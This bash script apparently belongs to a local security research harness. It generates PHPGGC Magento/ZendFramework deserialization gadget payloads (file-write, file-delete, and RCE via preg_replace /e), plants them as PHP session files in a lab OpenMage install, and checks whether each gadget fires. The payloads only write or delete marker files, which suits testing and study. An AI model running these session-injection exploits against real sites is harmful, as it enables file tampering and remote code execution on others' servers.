#!/bin/bash
# PHPGGC control runs: inject each shipped Magento/ZendFramework payload as a
# session file and let the stock app session_start() deserialize it.
# Session ids must be legal ([A-Za-z0-9,-]) and phpggc's trailing newline must
# be stripped, otherwise the session id/decode fails before the gadget matters.
set -u
R=/tmp/opencode/research/openmage_pop_20261022T021222Z
PHP=/tmp/opencode/realapps/install_realapps_np/bin/php
GG=/tmp/opencode/phpggc_openmage/phpggc
export LD_LIBRARY_PATH=/tmp/opencode/realapps/icu-out/lib:/tmp/opencode/realapps/onig-out/lib
cd "$R" || exit 1
LOG=$R/log/php_np.error.log

strip_nl() { # remove phpggc's trailing 0x0a if present
    if [ "$(tail -c 1 "$1" | xxd -p)" = "0a" ]; then truncate -s -1 "$1"; fi
}

run_case() { # $1=name $2=payload $3=note
    local name=$1 pay=$2 note=$3 sid=gg$1 s=www/var/session/sess_gg$1
    local before; before=$(wc -l < "$LOG")
    rm -f "$s"
    printf 'x|' > "$s"
    cat "$pay" >> "$s"
    chmod 600 "$s"
    echo "===== $name ($note) payload=$(stat -c%s "$pay") session=$(stat -c%s "$s")"
    python3 scripts/get_app.py 28896 "$sid" / "req/${name}_reader"
    sleep 0.5
    echo "-- new php log lines:"
    tail -n +$((before + 1)) "$LOG" | grep -Ev 'E_STRICT|Non-canonical|Implicitly marking' | head -8
}

# C-FW1: PHPGGC Magento/FW1 (needs Varien_Cache_Backend_Eaccelerator)
printf 'GG_FW1' > phase/gg_data.txt
$PHP "$GG" Magento/FW1 "$R/www/gg_fw1.php" "$R/phase/gg_data.txt" > phase/gg_fw1.bin 2> phase/gg_fw1.err
strip_nl phase/gg_fw1.bin
rm -f www/gg_fw1.php
run_case fw1 phase/gg_fw1.bin 'Magento/FW1 file-write'
ls -la www/gg_fw1.php 2>&1 | sed 's/^/   /'

# C-FD1: PHPGGC ZendFramework/FD1 (file delete)
printf 'DELETE_ME\n' > www/gg_victim.txt
$PHP "$GG" ZendFramework/FD1 "$R/www/gg_victim.txt" > phase/gg_fd1.bin 2> phase/gg_fd1.err
strip_nl phase/gg_fd1.bin
run_case fd1 phase/gg_fd1.bin 'ZendFramework/FD1 file-delete'
ls -la www/gg_victim.txt 2>&1 | sed 's/^/   /'

# C-RCE1: PHPGGC ZendFramework/RCE1 (preg_replace /e)
$PHP "$GG" ZendFramework/RCE1 "file_put_contents('$R/www/gg_rce1.php','GG_RCE1');" > phase/gg_rce1.bin 2> phase/gg_rce1.err
strip_nl phase/gg_rce1.bin
rm -f www/gg_rce1.php
run_case rce1 phase/gg_rce1.bin 'ZendFramework/RCE1 /e'
ls -la www/gg_rce1.php 2>&1 | sed 's/^/   /'
